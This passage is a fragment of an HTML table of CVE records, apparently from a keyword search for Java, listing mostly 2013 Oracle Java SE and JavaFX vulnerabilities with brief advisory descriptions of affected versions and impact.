		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1487">CVE-2013-1487</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE 7 Update 13 and earlier and 6 Update 39 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1486">CVE-2013-1486</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 13 and earlier, 6 Update 39 and earlier, and 5.0 Update 39 and earlier allows remote attackers to affect confidentiality, integrity, and availability via vectors related to JMX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1485">CVE-2013-1485</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 13 and earlier allows remote attackers to affect integrity via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1484">CVE-2013-1484</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 13 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1483">CVE-2013-1483</a></td>
		<td valign="top">Unspecified vulnerability in the JavaFX component in Oracle Java SE JavaFX 2.2.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than other CVEs listed in the February 2013 CPU.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1482">CVE-2013-1482</a></td>
		<td valign="top">Unspecified vulnerability in the JavaFX component in Oracle Java SE JavaFX 2.2.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than other CVEs listed in the February 2013 CPU.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1481">CVE-2013-1481</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 through Update 38, 5.0 through Update 38, and 1.4.2_40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Sound.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1480">CVE-2013-1480</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, 5.0 through Update 38, and 1.4.2_40 and earlier, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to AWT.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "insufficient validation of raster parameters" in awt_parseImage.c, which triggers memory corruption.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1479">CVE-2013-1479</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, and JavaFX 2.2.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1478">CVE-2013-1478</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, 5.0 through Update 38, and 1.4.2_40 and earlier, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "insufficient validation of raster parameters" that can trigger an integer overflow and memory corruption.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1477">CVE-2013-1477</a></td>
		<td valign="top">Unspecified vulnerability in the JavaFX component in Oracle Java SE JavaFX 2.2.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than other CVEs listed in the February 2013 CPU.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1476">CVE-2013-1476</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, 5.0 through Update 38, and 1.4.2_40 and earlier, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to CORBA, a different vulnerability than CVE-2013-0441 and CVE-2013-1475.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass Java sandbox restrictions via "certain value handler constructors."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1475">CVE-2013-1475</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, 5.0 through Update 38, and 1.4.2_40 and earlier, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to CORBA.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "IIOP type reuse management" in ObjectStreamClass.java.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1474">CVE-2013-1474</a></td>
		<td valign="top">Unspecified vulnerability in the JavaFX component in Oracle Java SE JavaFX 2.2.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than other CVEs listed in the February 2013 CPU.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1473">CVE-2013-1473</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11 and 6 through Update 38 allows remote attackers to affect integrity via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1472">CVE-2013-1472</a></td>
		<td valign="top">Unspecified vulnerability in the JavaFX component in Oracle Java SE JavaFX 2.2.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than other CVEs listed in the February 2013 CPU.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-1157">CVE-2013-1157</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in the IBM Tivoli Monitoring (ITM) Java servlet container in Cisco Prime Central for Hosted Collaboration Solution allows remote attackers to inject arbitrary web script or HTML via an unspecified parameter, aka Bug ID CSCud51068.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-10013">CVE-2013-10013</a></td>
		<td valign="top">A vulnerability was found in Bricco Authenticator Plugin. It has been declared as critical. This vulnerability affects the function authenticate/compare of the file src/java/talentum/escenic/plugins/authenticator/authenticators/DBAuthenticator.java. The manipulation leads to sql injection. Upgrading to version 1.39 is able to address this issue. The name of the patch is a5456633ff75e8f13705974c7ed1ce77f3f142d5. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-218428.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0967">CVE-2013-0967</a></td>
		<td valign="top">CoreTypes in Apple Mac OS X before 10.8.3 includes JNLP files in the list of safe file types, which allows remote attackers to bypass a Java plug-in disabled setting, and trigger the launch of Java Web Start applications, via a crafted web site.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0935">CVE-2013-0935</a></td>
		<td valign="top">EMC Smarts Network Configuration Manager (NCM) before 9.2 does not require authentication for all Java RMI method calls, which allows remote attackers to execute arbitrary code via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0809">CVE-2013-0809</a></td>
		<td valign="top">Unspecified vulnerability in the 2D component in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 15 and earlier, 6 Update 41 and earlier, and 5.0 Update 40 and earlier allows remote attackers to execute arbitrary code via unknown vectors, a different vulnerability than CVE-2013-1493.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0652">CVE-2013-0652</a></td>
		<td valign="top">GE Intelligent Platforms Proficy Real-Time Information Portal does not restrict access to methods of an unspecified Java class, which allows remote attackers to obtain a username listing via an RMI call.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0520">CVE-2013-0520</a></td>
		<td valign="top">IBM Sterling Secure Proxy 3.2.0 and 3.3.01 before 3.3.01.23 Interim Fix 1, 3.4.0 before 3.4.0.6 Interim Fix 1, and 3.4.1 before 3.4.1.7 allows remote authenticated users to obtain sensitive Java stack-trace information by providing invalid input data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0487">CVE-2013-0487</a></td>
		<td valign="top">The Java Console in IBM Domino 8.5.x allows remote authenticated users to hijack temporary credentials by leveraging knowledge of configuration details, aka SPR KLYH8TNNDN.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0485">CVE-2013-0485</a></td>
		<td valign="top">Unspecified vulnerability in IBM Java SDK 7 before SR4-FP1, 6 before SR13-FP1, 5.0 before SR16-FP1, and 1.4.2 before SR13-FP16 has unknown impact and attack vectors related to Class Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0450">CVE-2013-0450</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, and 5.0 through Update 38, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to JMX.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to improper checks of "access control context" in the JMX RequiredModelMBean class.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0449">CVE-2013-0449</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11 allows remote attackers to affect confidentiality via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0448">CVE-2013-0448</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11 allows remote attackers to affect integrity via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0447">CVE-2013-0447</a></td>
		<td valign="top">Unspecified vulnerability in the JavaFX component in Oracle Java SE JavaFX 2.2.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than other CVEs listed in the February 2013 CPU.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0446">CVE-2013-0446</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11 and 6 through Update 38 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than other CVEs listed in the February 2013 CPU.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0445">CVE-2013-0445</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, and 5.0 through Update 38, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to AWT.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to an improper check of "privileges of the code" that bypasses the sandbox.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0444">CVE-2013-0444</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Beans.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "insufficient checks for cached results" by the Java Beans MethodFinder, which might allow attackers to access methods that should only be accessible to privileged code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0443">CVE-2013-0443</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, 5.0 through Update 38, and 1.4.2_40 and earlier, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality and integrity via vectors related to JSSE.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to incorrect validation of Diffie-Hellman keys, which allows remote attackers to conduct a "small subgroup attack" to force the use of weak session keys or obtain sensitive information about the private key.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0442">CVE-2013-0442</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, 5.0 through Update 38, and 1.4.2_40 and earlier, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to AWT.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to an improper check of "privileges of the code" that bypasses the sandbox.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0441">CVE-2013-0441</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, 5.0 through Update 38, and 1.4.2_40 and earlier, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to CORBA, a different vulnerability than CVE-2013-1476 and CVE-2013-1475.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass Java sandbox restrictions via certain methods that should not be serialized, aka "missing serialization restriction."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0440">CVE-2013-0440</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, 5.0 through Update 38, and 1.4.2_40 and earlier, and OpenJDK 7, allows remote attackers to affect availability via vectors related to JSSE.  NOTE: the previous information is from the February 2013 CPU.  Oracle has not commented on claims from another vendor that this issue is related to CPU consumption in the SSL/TLS implementation via a large number of ClientHello packets that are not properly handled by (1) ClientHandshaker.java and (2) ServerHandshaker.java.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0439">CVE-2013-0439</a></td>
		<td valign="top">Unspecified vulnerability in the JavaFX component in Oracle Java SE JavaFX 2.2.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than other CVEs listed in the February 2013 CPU.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0438">CVE-2013-0438</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11 and 6 through Update 38 allows remote attackers to affect confidentiality via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0437">CVE-2013-0437</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11 and JavaFX 2.2.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0436">CVE-2013-0436</a></td>
		<td valign="top">Unspecified vulnerability in the JavaFX component in Oracle Java SE JavaFX 2.2.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than other CVEs listed in the February 2013 CPU.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0435">CVE-2013-0435</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11 and 6 through Update 38, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality via vectors related to JAX-WS.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to improper restriction of com.sun.xml.internal packages and "Better handling of UI elements."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0434">CVE-2013-0434</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, 5.0 through Update 38, and 1.4.2_40 and earlier, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality via vectors related to JAXP.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to the public declaration of the loadPropertyFile method in the JAXP FuncSystemProperty class, which allows remote attackers to obtain sensitive information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0433">CVE-2013-0433</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, and 5.0 through Update 38, and OpenJDK 6 and 7, allows remote attackers to affect integrity via unknown vectors related to Networking.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to avoid triggering an exception during the deserialization of invalid InetSocketAddress data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0432">CVE-2013-0432</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, 5.0 through Update 38, and 1.4.2_40 and earlier, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality and integrity via vectors related to AWT.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "insufficient clipboard access premission checks."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0431">CVE-2013-0431</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, and OpenJDK 7, allows user-assisted remote attackers to bypass the Java security sandbox via unspecified vectors related to JMX, aka "Issue 52," a different vulnerability than CVE-2013-1490.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0430">CVE-2013-0430</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11 and 6 through Update 38, allows local users to affect confidentiality, integrity, and availability via unknown vectors related to the installation process of the client.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0429">CVE-2013-0429</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, and 5.0 through Update 38, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to CORBA.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue involves the creation of a single PresentationManager that is shared across multiple thread groups, which allows remote attackers to bypass Java sandbox restrictions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0428">CVE-2013-0428</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, 5.0 through Update 38, and 1.4.2_40 and earlier, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries, a different vulnerability than CVE-2013-0425 and CVE-2013-0426.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "incorrect checks for proxy classes" in the Reflection API.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0427">CVE-2013-0427</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, and 5.0 through Update 38, and OpenJDK 6 and 7, allows remote attackers to affect integrity via unknown vectors related to Libraries.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to interrupt certain threads that should not be interrupted.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0426">CVE-2013-0426</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, 5.0 through Update 38, and 1.4.2_40 and earlier, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries, a different vulnerability than CVE-2013-0425 and CVE-2013-0428.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to incorrect "access control checks" in the logging API that allow remote attackers to bypass Java sandbox restrictions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0425">CVE-2013-0425</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, 5.0 through Update 38, and 1.4.2_40 and earlier, and OpenJDK 6 and 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries, a different vulnerability than CVE-2013-0428 and CVE-2013-0426.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to incorrect "access control checks" in the logging API that allow remote attackers to bypass Java sandbox restrictions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0424">CVE-2013-0424</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, 5.0 through Update 38, and 1.4.2_40 and earlier, and OpenJDK 7, allows remote attackers to affect integrity via vectors related to RMI. NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to cross-site scripting (XSS) in the sun.rmi.transport.proxy CGIHandler class that does not properly handle error messages in a (1) command or (2) port number.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0423">CVE-2013-0423</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11 and 6 through Update 38 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than other CVEs listed in the February 2013 CPU.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0422">CVE-2013-0422</a></td>
		<td valign="top">Multiple vulnerabilities in Oracle Java 7 before Update 11 allow remote attackers to execute arbitrary code by (1) using the public getMBeanInstantiator method in the JmxMBeanServer class to obtain a reference to a private MBeanInstantiator object, then retrieving arbitrary Class references using the findClass method, and (2) using the Reflection API with recursion in a way that bypasses a security check by the java.lang.invoke.MethodHandles.Lookup.checkSecurityManager method due to the inability of the sun.reflect.Reflection.getCallerClass method to skip frames related to the new reflection API, as exploited in the wild in January 2013, as demonstrated by Blackhole and Nuclear Pack, and a different vulnerability than CVE-2012-4681 and CVE-2012-3174. NOTE: some parties have mapped the recursive Reflection API issue to CVE-2012-3174, but CVE-2012-3174 is for a different vulnerability whose details are not public as of 20130114.  CVE-2013-0422 covers both the JMX/MBean and Reflection API issues.  NOTE: it was originally reported that Java 6 was also vulnerable, but the reporter has retracted this claim, stating that Java 6 is not exploitable because the relevant code is called in a way that does not bypass security checks.  NOTE: as of 20130114, a reliable third party has claimed that the findClass/MBeanInstantiator vector was not fixed in Oracle Java 7 Update 11.  If there is still a vulnerable condition, then a separate CVE identifier might be created for the unfixed issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0419">CVE-2013-0419</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11 and 6 through Update 38 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than other CVEs listed in the February 2013 CPU.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0409">CVE-2013-0409</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11, 6 through Update 38, and 5.0 through Update 38 allows remote attackers to affect confidentiality via vectors related to JMX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0402">CVE-2013-0402</a></td>
		<td valign="top">Heap-based buffer overflow in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier and JavaFX 2.2.7 and earlier allows remote attackers to execute arbitrary code via unspecified vectors related to JavaFX, as demonstrated by VUPEN during a Pwn2Own competition at CanSecWest 2013.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0401">CVE-2013-0401</a></td>
		<td valign="top">The Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, 6 Update 43 and earlier, and 5.0 Update 41 and earlier; and OpenJDK 6 and 7; allows remote attackers to execute arbitrary code via vectors related to AWT, as demonstrated by Ben Murphy during a Pwn2Own competition at CanSecWest 2013.  NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to invocation of the system class loader by the sun.awt.datatransfer.ClassLoaderObjectInputStream class, which allows remote attackers to bypass Java sandbox restrictions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0351">CVE-2013-0351</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11 and 6 through Update 38 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than other CVEs listed in the February 2013 CPU.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0150">CVE-2013-0150</a></td>
		<td valign="top">Directory traversal vulnerability in an unspecified signed Java applet in the client-side components in F5 BIG-IP APM 10.1.0 through 10.2.4 and 11.0.0 through 11.3.0, FirePass 6.0.0 through 6.1.0 and 7.0.0, and other products "when APM is provisioned," allows remote attackers to upload and execute arbitrary files via a ..  (dot dot) in the filename parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-0127">CVE-2013-0127</a></td>
		<td valign="top">IBM Lotus Notes 8.x before 8.5.3 FP4 Interim Fix 1 and 9.0 before Interim Fix 1 does not block APPLET elements in HTML e-mail, which allows remote attackers to bypass intended restrictions on Java code execution and X-Confirm-Reading-To functionality via a crafted message, aka SPRs JMOY95BLM6 and JMOY95BN49.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-6636">CVE-2012-6636</a></td>
		<td valign="top">The Android API before 17 does not properly restrict the WebView.addJavascriptInterface method, which allows remote attackers to execute arbitrary methods of Java objects by using the Java Reflection API within crafted JavaScript code that is loaded into the WebView component in an application targeted to API level 16 or earlier, a related issue to CVE-2013-4710.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-6347">CVE-2012-6347</a></td>
